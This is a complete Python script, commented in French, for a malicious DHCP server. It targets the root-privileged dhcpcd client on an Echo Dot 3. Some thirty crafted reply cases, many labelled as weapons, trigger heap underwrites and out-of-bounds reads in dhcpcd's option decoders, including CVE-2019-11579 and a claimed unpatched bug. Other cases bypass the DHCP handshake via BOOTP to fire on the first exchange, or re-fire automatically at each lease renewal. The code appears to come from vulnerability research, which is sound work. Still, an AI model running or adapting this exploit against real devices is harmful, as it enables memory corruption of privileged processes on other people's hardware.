#!/usr/bin/env python3
"""evil_dhcp2 — Serveur DHCP malveillant v2 pour Echo Dot 3 (dhcpcd 5.5.6 AOSP Nougat, ROOT).

CORRECTIONS vs evil_dhcp.py (v1) :
  - En-tête BOOTP EXACT 236 octets + cookie à 236 (v1 oubliait yiaddr/siaddr/giaddr
    → cookie à 224 → le client jetait TOUT avant de parser — campagne v1 nulle).
  - OFFER sur DISCOVER, ACK sur REQUEST, NAK optionnel (v1 répondait toujours OFFER).
  - Fingerprint complet du client (dump hexa + parse options 55/60/61/12) dans
    /tmp/fakeap/dhcp_fingerprint.log → identifie dhcpcd vs autre client.

CIBLE (audit du code réel android-wear-7.1.1_r1 = dhcpcd d'Android 7.x, exécuté en ROOT) :
  - dhcp.c:get_option()        : TLV bornés (clamp e-(p+1)), concat RFC3396 borné (504<552)
  - dhcp.c:decode_rfc3397()    : ★ label VIDE initial → *(out-1)=' ' = ÉCRITURE 1 octet
    AVANT un bloc xmalloc(count) [underrwrite heap, process ROOT] — options 119/81/120
    ★ label tronqué en fin de paquet 552 o → memcpy de l octets hors du bloc heap
  - dhcp.c:decode_rfc3442_rt() : ★ route 121/249 tronquée sans passerelle → memcpy 4 o
    lus à p==e (dépasse le bloc heap si l'option termine le paquet)
  - Le buffer cible = xzalloc(sizeof(dhcp_message)) = 552 o (240 en-tête+cookie,
    options[312]) ; les décodeurs tournent via configure_env()/print_option() au
    moment du BIND (ACK), pour TOUTE option PRÉSENTE (même non demandée).

Usage :
  sudo python3 evil_dhcp2.py --list                 # liste des cas
  sudo python3 evil_dhcp2.py --case ctrl_ok         # contrôle sain (doit configurer)
  sudo python3 evil_dhcp2.py --case ds_underr       # arme : underrwrite heap
  sudo python3 evil_dhcp2.py --case all --seq       # séquence, un cas par REQUEST
Options : --iface wlan0 --ip 192.168.50.1 --offer-ip 192.168.50.25 --lease 3600 --nak
Oracle crash : le client re-DISCOVER sans jamais REQUEST/configurer ; discriminer d'un
rejet propre en rejouant --case ctrl_ok ensuite (si ça configure → parser vivant).
"""
import argparse
import socket
import struct
import sys
import time

LOGF = "/tmp/fakeap/evil_dhcp2.log"
FPLOG = "/tmp/fakeap/dhcp_fingerprint.log"
OPT_END, OPT_PAD, OPT_MSGLINE, OPT_OVERLOAD = 255, 0, 53, 52
HDR_LEN = 240            # BOOTP 236 + cookie 4
OPTS_MAX = 312           # dhcp->options[312] → bloc heap 552
PAYLOAD_MAX = 552        # sizeof(struct dhcp_message)


def log(msg):
    with open(LOGF, "a") as f:
        f.write("%s %s\n" % (time.strftime("%H:%M:%S"), msg))
    print(msg, flush=True)


def flog(msg):
    with open(FPLOG, "a") as f:
        f.write("%s %s\n" % (time.strftime("%H:%M:%S"), msg))
    print(msg, flush=True)


def parse_opts(pkt, start=240):
    out, i = {}, start
    while i + 1 < len(pkt):
        c = pkt[i]
        if c == OPT_END:
            break
        if c == OPT_PAD:
            i += 1
            continue
        l = pkt[i + 1]
        out.setdefault(c, []).append(pkt[i + 2:i + 2 + l])
        i += 2 + l
    return out


def opt(code, data):
    assert 1 <= len(data) <= 255, (code, len(data))
    return bytes([code, len(data)]) + bytes(data)


def end548(mand_opts, weapon):
    """Place `weapon` en DERNIERS octets du paquet de 552 o (pads avant).
    Le bloc heap du client fait exactement 552 o → toute lecture past `e`
    après le dernier octet de weapon DÉPASSE le malloc."""
    pad = OPTS_MAX - 3 - len(mand_opts) - len(weapon)
    if pad < 0:
        raise ValueError("mand+weapon > 309 o (%d)" % (len(mand_opts) + len(weapon)))
    return ("end", mand_opts + b"\0" * pad + weapon)


# ---------------------------------------------------------------- constr. paquet
def build_msg(xid, chaddr, flags, mtype, yiaddr, saddr, giaddr=b"\0\0\0\0",
              opts=b"", sname=None, bootfile=None):
    """BOOTP exact : cookie à l'offset 236, options à 240. Pas de END nécessaire
    (le parseur client est borné par le champ options, pas par END)."""
    sname = (sname + b"\0" * 64)[:64] if sname else b"\0" * 64
    bootf = (bootfile + b"\0" * 128)[:128] if bootfile else b"\0" * 128
    hdr = struct.pack("!BBBB", 2, 1, 6, 0)
    hdr += xid
    hdr += struct.pack("!HH", 0, flags & 0xFFFF)
    hdr += b"\0\0\0\0"                       # ciaddr
    hdr += socket.inet_aton(yiaddr)
    hdr += socket.inet_aton(saddr)
    hdr += giaddr
    hdr += chaddr + b"\0" * (16 - len(chaddr))
    hdr += sname + bootf
    hdr += b"\x63\x82\x53\x63"
    body = (opt(OPT_MSGLINE, [mtype]) if mtype is not None else b"") + opts
    total = len(hdr) + len(body)
    if total > PAYLOAD_MAX:
        raise ValueError("payload %d > %d" % (total, PAYLOAD_MAX))
    return hdr + body


# ---------------------------------------------------------------- cas de test
def mand(srv_ip, lease=3600, extra=None):
    o = b""
    o += opt(1, socket.inet_aton("255.255.255.0"))
    o += opt(54, socket.inet_aton(srv_ip))
    o += opt(51, struct.pack("!I", lease))
    o += opt(3, socket.inet_aton(srv_ip))
    o += opt(6, socket.inet_aton(srv_ip))
    if extra:
        o += extra
    return o


def case_ctrl_ok(ip, lease):
    """Contrôle sain : le device DOIT faire REQUEST puis se configurer."""
    return mand(ip, lease, opt(15, b"test") + opt(26, struct.pack("!H", 1500)))


def case_underr_storm(ip, lease):
    # ★ tir répété automatique : bail 120 s, renewal (58) 20 s → l'arme
    # (underrwrite) re-tire à CHAQUE ACK de renouvellement, sans intervention
    return mand(ip, 120, opt(58, struct.pack("!I", 20)) + opt(59, struct.pack("!I", 60))
                + opt(119, b"\x00\x03abc"))


def case_gate_storm(ip, lease):
    # idem avec l'arme csr_gate4_oob
    routes = b"".join(b"\x00" + socket.inet_aton("10.99.%d.%d" % (i // 256, i % 256))
                      for i in range(20))
    routes += b"\x20" + socket.inet_aton("10.10.10.10")
    return mand(ip, 120, opt(58, struct.pack("!I", 20)) + opt(59, struct.pack("!I", 60))
                + opt(121, routes))


def case_ds_underr(ip, lease):
    # ★ 119 domain_search : 1er label VIDE → decode_rfc3397 écrit tmp[-1]=' '
    return mand(ip, lease, opt(119, b"\x00\x03abc"))


def case_ds_underr_long(ip, lease):
    # label vide + label 63 'A' : memcpy 63 o dans xmalloc(64) exact + underr
    return mand(ip, lease, opt(119, b"\x00\x3f" + b"A" * 63))


def case_ds_underr_multi(ip, lease):
    # labels vides multiples → *(out-1) répétés (s[-1] + intérieurs)
    return mand(ip, lease, opt(119, b"\x00\x03aaa\x00\x03bbb\x00\x03ccc"))


def case_fqdn_underr(ip, lease):
    # ★ 81 : configure_env saute 3 octets de flags puis RFC3397 → underr
    return mand(ip, lease, opt(81, b"\x00\x00\x00" + b"\x00\x03abc"))


def case_sip_underr(ip, lease):
    # 120 (RFC3361 enc=0) → délègue à decode_rfc3397 → underr
    return mand(ip, lease, opt(120, b"\x00" + b"\x00\x03abc"))


def case_ds_label_lie_end(ip, lease):
    # 119 en derniers octets : label déclare 5, 2 présents → memcpy 5 depuis 2
    # (xmalloc(count) 6 o ; la lecture dépasse `pl` ; à la frontière du bloc)
    return end548(mand(ip, lease), opt(119, b"\x05ab"))


def case_csr_gate4_oob(ip, lease):
    # ★ 121 : routes cidr=0 complètes + entrée cidr=32 (4 octets dest) SANS
    # passerelle, en fin de paquet 552 → memcpy(gate, p, 4) à p==e → OOB heap
    routes = b"".join(b"\x00" + socket.inet_aton("10.99.%d.%d" % (i // 256, i % 256))
                      for i in range(20))
    routes += b"\x20" + socket.inet_aton("10.10.10.10")
    return end548(mand(ip, lease), opt(121, routes))


def case_csr_gate0_oob(ip, lease):
    # dernière entrée = cidr seul (0), rien derrière → gate 4 o entièrement OOB
    return end548(mand(ip, lease), opt(121, b"\x00" * 40 + b"\x00"))


def case_ms249_gate_oob(ip, lease):
    # 249 (variante MS) : même décodeur, entrée finale tronquée
    return end548(mand(ip, lease), opt(249, b"\x00" + socket.inet_aton("10.0.0.1") * 50
                                       + b"\x20\x01\x02\x03\x04"))


def case_ds_ptr_hops(ip, lease):
    # pointeurs c000 en boucle → garde hops>255 (retour propre attendu)
    return mand(ip, lease, opt(119, b"\xc0\x00" * 100))


def case_ds_bad_ltype(ip, lease):
    # labels avec bits réservés 0x40/0x80 → garde ltype
    return mand(ip, lease, opt(119, b"\x40\x03abc\x80\x03def"))


def case_concat_underr(ip, lease):
    # RFC3396 : 119 en 2 exemplaires → concat dans opt_buffer puis underr
    return mand(ip, lease, opt(119, b"\x00\x02ab") + opt(119, b"\x03cde"))


def case_overload_weapons(ip, lease):
    # 52=3 : bootfile ET servername parsés comme options ; 119 armé dans bootfile
    bootf = opt(119, b"\x00\x03zzz")
    sname = b"\x00" + socket.inet_aton("172.16.0.1") * 10 + b"\x20\x0a\x0b\x0c\x0d"
    o = mand(ip, lease, opt(OPT_OVERLOAD, b"\x03") + opt(121, b"\x00" * 35 + b"\x00"))
    return ("overload", o, sname, bootf)


def case_len_lie_router(ip, lease):
    # garde : option 3 déclare 200, 4 octets présents → clamp attendu
    return mand(ip, lease, bytes([3, 200]) + socket.inet_aton(ip))


def case_opt52_len0(ip, lease):
    # 52 longueur 0 : overl = 0x80|p[1] lit l'octet SUIVANT (hors option)
    return mand(ip, lease, bytes([OPT_OVERLOAD, 0]) + opt(15, b"\x00lab"))


def case_dup_opt53(ip, lease):
    return mand(ip, lease, opt(OPT_MSGLINE, [5]))


def case_after_end(ip, lease):
    # arme APRÈS le END → doit être ignorée (garde)
    return mand(ip, lease) + bytes([OPT_END]) + opt(119, b"\x00\x03abc")


def case_lease_zero(ip, lease):
    return mand(ip, 1, opt(58, b"\0\0\0\0") + opt(59, b"\0\0\0\0"))


def case_csr_cidr_33(ip, lease):
    return mand(ip, lease, opt(121, b"\x21" + b"\x0a" * 4 + b"\x0a" * 4))


def case_bootp_underr(ip, lease):
    # ★ CONTournement BOOTP : PAS d'option 53 → dhcpcd (DHS_DISCOVER) accepte
    # l'offre telle quelle, saute REQUEST/ACK, bind direct → configure_env →
    # l'arme 119 tire dès le PREMIER échange (1 paquet au lieu de 4)
    return ("bootp", mand(ip, lease, opt(119, b"\x00\x03abc")))


def case_bootp_gate(ip, lease):
    # idem, arme 121 gate-OOB en fin de paquet 552, sans option 53
    routes = b"".join(b"\x00" + socket.inet_aton("10.99.%d.%d" % (i // 256, i % 256))
                      for i in range(20))
    routes += b"\x20" + socket.inet_aton("10.10.10.10")
    return ("end548", mand(ip, lease) + opt(121, routes))


def case_opt3_len1_end(ip, lease):
    # ★ valid_length ne rejette QUE -1 ; dl%sz=1 passe ! get_option_routes lit
    # 4 o (gate) depuis 1 octet en fin de paquet 552 → OOB heap
    return end548(mand(ip, lease), bytes([3, 1]) + socket.inet_aton(ip))


def case_opt3_len5_end(ip, lease):
    # idem len=5 : gate lue à e+1..e+4 → 3 o hors du bloc
    return end548(mand(ip, lease), bytes([3, 5]) + socket.inet_aton(ip) + b"\x01")


def case_opt33_len5_end(ip, lease):
    # option 33 static_routes len=5 : dest 4 lus, gate 4 lus à e → OOB
    return end548(mand(ip, lease), bytes([33, 5]) + b"\x0a" * 5)


def case_opt52_end(ip, lease):
    # ★ CVE-2019-11579 CONFIRMÉE VIVANTE sur dhcpcd 6.8.2 (fix upstream 7.2.1)
    # `overl = 0x80 | p[1]` lit p[1] sans vérifier la longueur de l'option 52 ;
    # si [52,0] termine le paquet 552 → lecture à 552 = hors du calloc(552)
    return end548(mand(ip, lease), bytes([OPT_OVERLOAD, 0]))


def case_last_byte_code(ip, lease):
    # ★ NOUVEAU (6.8.2, non corrigé upstream à ce jour) : boucle `while (p < e)`
    # → si le DERNIER octet du paquet 552 est un CODE d'option sans octet de
    # longueur derrière : `ol = *p` ou `l = *p++` lit à l'offset 552 = hors du
    # calloc(552). Toute option peut servir ; on met 119 (recherchée).
    return end548(mand(ip, lease), bytes([119]))


def case_bootp_opt52(ip, lease):
    # ★ COMBO : contournement BOOTP (pas d'option 53 → pas de REQUEST/ACK,
    # bind direct) + arme CVE-2019-11579 : tir au PREMIER échange.
    # NB : pas d'option 53 → budget options complet sans les 3 octets du 53.
    # [52,0] en DERNIERS octets du paquet 552.
    m = mand(ip, lease)
    return ("bootp", m + b"\0" * (OPTS_MAX - len(m) - 2) + bytes([OPT_OVERLOAD, 0]))


CASES = {
    "ctrl_ok": ("contrôle sain — doit configurer", case_ctrl_ok),
    "underr_storm": ("★119 underr + bail 120/renew 20 → tir auto toutes les 20 s", case_underr_storm),
    "gate_storm": ("★121 gate-OOB + renew 20 s → tir auto", case_gate_storm),
    "ds_underr": ("★119 label vide → underrwrite heap 1 o (root)", case_ds_underr),
    "ds_underr_long": ("★119 label vide + label 63 → underr + remplissage exact", case_ds_underr_long),
    "ds_underr_multi": ("119 labels vides multiples → *(out-1) répétés", case_ds_underr_multi),
    "fqdn_underr": ("★81 FQDN → même underr après flags", case_fqdn_underr),
    "sip_underr": ("120 SIP RFC3361 enc=0 → underr par délégation", case_sip_underr),
    "ds_label_lie_end": ("119 en fin de paquet : label>données → overread heap", case_ds_label_lie_end),
    "csr_gate4_oob": ("★121 cidr=32 sans passerelle en fin de paquet → memcpy 4 o OOB", case_csr_gate4_oob),
    "csr_gate0_oob": ("121 dernière entrée cidr seul → gate 4 o OOB", case_csr_gate0_oob),
    "ms249_gate_oob": ("249 variante MS → gate OOB", case_ms249_gate_oob),
    "ds_ptr_hops": ("119 pointeurs c000 en boucle → garde hops", case_ds_ptr_hops),
    "ds_bad_ltype": ("119 labels 0x40/0x80 → garde ltype", case_ds_bad_ltype),
    "concat_underr": ("119 ×2 (RFC3396 concat) → underr sur concaténé", case_concat_underr),
    "overload_weapons": ("52=3 : 119/121 armés dans bootfile+sname", case_overload_weapons),
    "len_lie_router": ("garde : option 3 len 200 mensongère", case_len_lie_router),
    "opt52_len0": ("52 len 0 → overl lit l'octet hors option", case_opt52_len0),
    "dup_opt53": ("53 dupliqué (OFFER puis ACK)", case_dup_opt53),
    "after_end": ("arme après END → ignorée attendue", case_after_end),
    "lease_zero": ("bail 1 s, renewal/rebind 0 (stress fonctionnel)", case_lease_zero),
    "csr_cidr_33": ("121 cidr=33 → garde EINVAL", case_csr_cidr_33),
    "opt3_len1_end": ("★3 routers len=1 en fin de paquet → gate 4 o OOB (valid_length passe)", case_opt3_len1_end),
    "opt3_len5_end": ("★3 routers len=5 en fin → 3 o OOB", case_opt3_len5_end),
    "opt33_len5_end": ("★33 static_routes len=5 en fin → gate OOB", case_opt33_len5_end),
    "opt52_end": ("★CVE-2019-11579 VIVANTE sur 6.8.2 : option 52 len=0 en fin de paquet → lecture à 552", case_opt52_end),
    "last_byte_code": ("★6.8.2 : code d'option en dernier octet, sans longueur → lecture à 552 (while p<e)", case_last_byte_code),
    "bootp_opt52": ("★COMBO : BOOTP sans 53 + opt52_end → CVE tirée au 1er échange", case_bootp_opt52),
    "bootp_underr": ("★réponse BOOTP sans option 53 + arme 119 → tir au 1er échange (machine à états contournée)", case_bootp_underr),
    "bootp_gate": ("★BOOTP sans 53 + arme 121 en fin de paquet 552", case_bootp_gate),
}
ORDER = ["ctrl_ok", "underr_storm", "gate_storm", "bootp_underr", "bootp_gate", "ds_underr", "ds_underr_long", "fqdn_underr", "sip_underr",
         "csr_gate4_oob", "csr_gate0_oob", "opt3_len1_end", "opt3_len5_end",
         "opt33_len5_end", "opt52_end", "ms249_gate_oob", "ds_label_lie_end",
         "ds_underr_multi", "concat_underr", "overload_weapons", "len_lie_router",
         "opt52_len0", "dup_opt53", "after_end", "lease_zero",
         "csr_cidr_33", "ds_ptr_hops", "ds_bad_ltype"]


def _mtype_of(req):
    v = parse_opts(req).get(OPT_MSGLINE)
    return v[0][0] if v else None


def build_reply(req, name, ip, offer_ip, lease, nak=False):
    xid = req[4:8]
    chaddr = req[28:34]
    flags = struct.unpack("!H", req[10:12])[0]
    built = CASES[name][1](ip, lease)
    sname = bootf = None
    bootp = name.startswith("bootp")
    if isinstance(built, tuple):
        if built[0] == "overload":
            _, opts, sname, bootf = built
        else:
            _, opts = built
    else:
        opts = built
    mtype = None if bootp else (6 if nak else (2 if _mtype_of(req) == 1 else 5))
    return build_msg(xid, chaddr, flags, mtype, offer_ip, ip, opts=opts,
                     sname=sname, bootfile=bootf)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--case", default="ctrl_ok")
    ap.add_argument("--seq", action="store_true", help="cycle ORDER, un cas par REQUEST")
    ap.add_argument("--iface", default="wlan0")
    ap.add_argument("--ip", default="192.168.50.1")
    ap.add_argument("--offer-ip", default="192.168.50.25")
    ap.add_argument("--lease", type=int, default=3600)
    ap.add_argument("--nak", action="store_true")
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--log", default=LOGF)
    args = ap.parse_args()
    globals()["LOGF"] = args.log

    if args.list:
        for n in ORDER:
            print("%-18s %s" % (n, CASES[n][0]))
        return

    name = args.case
    if name != "all" and name not in CASES:
        print("cas inconnu : %s (--list)" % name)
        sys.exit(1)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    try:
        s.setsockopt(socket.SOL_SOCKET, 25, (args.iface + "\0").encode())  # SO_BINDTODEVICE
    except OSError:
        log("SO_BINDTODEVICE impossible — continue sans")
    s.bind(("0.0.0.0", 67))
    log("=== evil_dhcp2 case=%s%s offer=%s gw=%s ===" %
        (name, " SEQ" if args.seq else "", args.offer_ip, args.ip))

    seq_i, seen_fp, n = 0, False, 0
    while True:
        try:
            data, addr = s.recvfrom(2048)
        except Exception as e:
            log("recv err %s" % e)
            continue
        if len(data) < 240:
            continue
        mtype = _mtype_of(data)
        src = "%s:%d" % addr
        if mtype in (1, 3, 8):
            if not seen_fp:
                seen_fp = True
                with open(FPLOG + ".bin", "wb") as f:
                    f.write(data)
                o = parse_opts(data)
                flog("FINGERPRINT %s len=%d type=%d" % (src, len(data), mtype))
                flog("  opt55(param-list)=%s" % list(o.get(55, [b""])[0]))
                flog("  opt60=%r opt61=%r opt12=%r opt81=%r" % (
                    o.get(60, [b"?"])[0][:40], o.get(61, [b"?"])[0][:20],
                    o.get(12, [b"?"])[0][:40], o.get(81, [b"?"])[0][:20]))
                flog("  options présentes: %s" % sorted(o.keys()))
            cur = ORDER[seq_i % len(ORDER)] if (args.seq or name == "all") else name
            if mtype == 3:
                seq_i += 1
            n += 1
            try:
                reply = build_reply(data, cur, args.ip, args.offer_ip, args.lease, nak=args.nak)
            except Exception as e:
                log("[%d] ERREUR construction cas=%s : %s" % (n, cur, e))
                continue
            # RENEW/REBIND unicast (client a déjà une IP) → répondre unicast
            dst = (addr[0], 68) if addr[0] not in ("0.0.0.0", "") else ("255.255.255.255", 68)
            s.sendto(reply, dst)
            log("[%d] type=%d de %s → %s (%d o) cas=%s dst=%s" %
                (n, mtype, src, "NAK" if args.nak else ("OFFER" if mtype == 1 else "ACK"),
                 len(reply), cur, dst[0]))
        else:
            log("[%d] type=%s de %s (ignoré)" % (n, mtype, src))


if __name__ == "__main__":
    main()
